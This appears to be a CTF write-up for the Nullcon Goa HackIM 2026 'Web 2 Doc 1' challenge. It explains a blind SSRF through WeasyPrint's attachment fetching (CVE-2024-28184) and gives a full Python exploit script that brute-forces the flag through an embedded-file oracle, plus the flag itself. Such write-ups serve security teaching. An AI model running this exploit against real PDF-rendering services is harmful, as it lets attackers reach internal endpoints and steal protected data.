---
title: "Web 2 Doc 1 - Nullcon Goa HackIM 2026 CTF"
category: "web"
subcategory: "ssrf"
type: "writeup"
tags: ["web", "ssrf", "base64", "eval", "subprocess", "nullcon-goa-hackim-2026-ctf", "2026", "ctf-writeup"]
summary: "Event: Nullcon Goa HackIM 2026 CTF"
source:
  name: "CTFtime writeup #40635"
  url: "https://ctftime.org/writeup/40635"
original_source: "https://github.com/RootRunners/Nullcon-Goa-HackIM-2026-CTF-RootRunners-Official-Write-ups/blob/main/Web/Web_2_Doc_1/README.md"
ctf:
  name: "Nullcon Goa HackIM 2026 CTF"
  year: 2026
  challenge: "Web 2 Doc 1"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2026 CTF
- **Task:** Web 2 Doc 1
- **Author team:** RootRunners
- **CTFtime tags:** web
- **CTFtime:** <https://ctftime.org/writeup/40635>
- **Original writeup:** <https://github.com/RootRunners/Nullcon-Goa-HackIM-2026-CTF-RootRunners-Official-Write-ups/blob/main/Web/Web_2_Doc_1/README.md>

---
# Web 2 Doc 1

**Event:** Nullcon Goa HackIM 2026 CTF   
**Category:** Web   
**Points:** 395   
**Service:** `52.59.124.14:5002` 

## Overview  
The app converts a URL to PDF. The protected endpoint `/admin/flag` is intended to be reachable only from localhost and rejects requests with header `X-Fetcher: internal`. WeasyPrint attachment fetching bypasses that restriction and gives a blind boolean oracle.

## Vulnerability  
\- `/admin/flag` checks the caller IP (localhost) and blocks if `X-Fetcher: internal` is present.  
\- WeasyPrint fetches `[` in a separate path without the `X-Fetcher` header.  
\- Those attachment fetches originate from localhost, so they can access `/admin/flag`.](https://ctftime.org/...)

This is consistent with the WeasyPrint attachment fetch issue (GHSA-35jj-wx47-4w8r / CVE-2024-28184).

## Solution  
1\. Solve the math captcha on `/`.  
2\. Submit `/convert` with a URL that returns HTML containing an attachment link to `http://127.0.0.1:5000/admin/flag?i=...&c=...`.  
3\. The attachment is embedded in the PDF only when the guess is correct.  
4\. Use the presence of `/Type /EmbeddedFile` as a boolean oracle to brute-force the flag.

## Requirements  
\- Python 3  
\- `curl`, `strings`

## Exploit Script  
```python  
#!/usr/bin/env python3  
import ast  
import base64  
import operator  
import re  
import subprocess  
import urllib.parse

BASE = "http://52.59.124.14:5002"  
# Internal backend that accepts localhost-only admin_flag checks  
INTERNAL_FLAG_URL = "http://127.0.0.1:5000/admin/flag"

CHARSET = (  
"ENO{}_"  
"abcdefghijklmnopqrstuvwxyz"  
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"  
"0123456789"  
"!@#$%^&*()-=+[]:;,.?/\\\|~`\"'"  
)

OPS = {  
ast.Add: operator.add,  
ast.Sub: operator.sub,  
ast.Mult: operator.mul,  
ast.FloorDiv: operator.floordiv,  
ast.Div: operator.floordiv,  
}

def safe_eval(expr: str) -> int:  
node = ast.parse(expr, mode="eval").body  
if not isinstance(node, ast.BinOp):  
raise ValueError(f"Unsupported captcha expression: {expr}")  
if type(node.op) not in OPS:  
raise ValueError(f"Unsupported operator in captcha: {expr}")  
if not isinstance(node.left, ast.Constant) or not isinstance(node.right, ast.Constant):  
raise ValueError(f"Unexpected captcha AST: {expr}")  
return int(OPS[type(node.op)](int(node.left.value), int(node.right.value)))

def run(cmd, timeout=20):  
return subprocess.check_output(cmd, stderr=subprocess.DEVNULL, timeout=timeout)

def get_captcha_answer(cookie_file: str) -> int:  
html = run(["curl", "--max-time", "6", "-sS", "-c", cookie_file, f"{BASE}/"], timeout=10)  
text = html.decode("utf-8", "ignore")  
m = re.search(r"Math Challenge:\s*([^=]+)=\s*\?", text)  
if not m:  
raise RuntimeError("Failed to parse captcha")  
return safe_eval(m.group(1).strip())

def convert_with_payload_html(payload_html: str) -> bytes:  
b64 = base64.b64encode(payload_html.encode()).decode()  
payload_url = "http://httpbin.org/base64/" + urllib.parse.quote(b64, safe="")

cookie_file = "/tmp/web2doc1_ck.txt"  
captcha_answer = get_captcha_answer(cookie_file)

resp = run(  
[  
"curl",  
"--max-time",  
"12",  
"-sS",  
"-i",  
"-b",  
cookie_file,  
"-X",  
"POST",  
f"{BASE}/convert",  
"-F",  
f"url={payload_url}",  
"-F",  
f"captcha_answer={captcha_answer}",  
],  
timeout=20,  
)

if b"\r\n\r\n" not in resp:  
raise RuntimeError("Malformed HTTP response from /convert")

head, body = resp.split(b"\r\n\r\n", 1)  
if b"Content-Type: application/pdf" not in head:  
# Usually means the fetch failed and app returned JSON error  
raise RuntimeError(body.decode("utf-8", "ignore"))

return body

def oracle(index: int, ch: str) -> bool:  
target = f"{INTERNAL_FLAG_URL}?i={index}&c={urllib.parse.quote(ch, safe='')}"  
html = f'<html><body>[A](https://ctftime.org/{target})</body></html>'  
pdf = convert_with_payload_html(html)

with open("/tmp/web2doc1_out.pdf", "wb") as f:  
f.write(pdf)

# Embedded attachment exists only when target returned HTTP 200.  
strings_out = run(["strings", "-n", "3", "/tmp/web2doc1_out.pdf"], timeout=10)  
return b"/Type /EmbeddedFile" in strings_out

def solve(max_len: int = 80) -> str:  
flag = ""  
for i in range(max_len):  
found = None  
for ch in CHARSET:  
ok = False  
for _ in range(3):  
try:  
ok = oracle(i, ch)  
break  
except Exception:  
ok = False  
print(f"i={i} ch={ch!r} -> {ok}")  
if ok:  
found = ch  
flag += ch  
print("FLAG_SO_FAR", flag)  
break

if found is None:  
break

if found == "}" and flag.startswith("ENO{"):  
break

return flag

if __name__ == "__main__":  
result = solve()  
print("FINAL", result)  
```

## Flag  
`ENO{weasy_pr1nt_can_h4v3_bl1nd_ssrf_OK!}`
